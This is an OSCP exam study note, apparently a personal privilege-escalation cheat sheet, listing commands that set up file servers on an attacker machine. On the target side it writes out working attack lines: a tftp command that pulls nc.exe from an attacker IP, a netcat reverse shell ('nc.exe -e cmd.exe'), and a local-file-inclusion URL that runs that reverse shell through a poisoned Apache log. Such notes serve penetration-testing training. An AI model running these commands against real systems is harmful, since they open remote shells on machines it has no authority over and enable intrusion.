---
categories:
- OSCP
- PrivilegeEscalation
status: done
tags: OSCP, PrivilegeEscalation 
created_date : Tuesday 21 February 2023 (08:50) 
---
# PrivilegeEscalation - Common


## Set up Webserver
```
python -m SimpleHTTPServer 8080
https://github.com/sc0tfree/updog
updog
```

## Set up FTP Server
```
# Install pyftpdlib
pip install pyftpdlib

# Run (-w flag allows anonymous write access)
python -m pyftpdlib -p 21 -w
```

## Set up TFTP
```
# In Kali
atftpd --daemon --port 69 /tftp

# In reverse Windows
tftp -i 10.11.1.111 GET nc.exe
nc.exe -e cmd.exe 10.11.1.111 4444

http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=nc.exe%20-e%20cmd.exe%2010.11.0.105%204444
```